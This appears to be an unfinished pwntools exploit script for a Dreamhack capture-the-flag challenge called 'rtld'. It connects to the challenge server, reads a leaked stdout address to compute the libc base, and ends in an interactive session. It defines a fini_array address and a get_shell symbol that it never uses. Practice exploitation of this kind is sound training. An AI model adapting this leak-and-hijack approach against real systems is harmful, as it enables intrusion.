from pwn import *
context.log_level='debug'

host = 'host1.dreamhack.games'
port = 18243

p = remote(host,port)

elf = ELF('./rtld')
libc = ELF('./libc.so.6')

fini_array = 0x0000000000201dd8
get_shell = elf.symbols['get_shell']
stdout_offset = libc.symbols['stdout']

p.recvuntil('stdout: ')
recv_stdout = p.recvline()[:-1]
recv_stdout = int(recv_stdout,16)
libc_base = recv_stdout-stdout_offset



p.interactive()
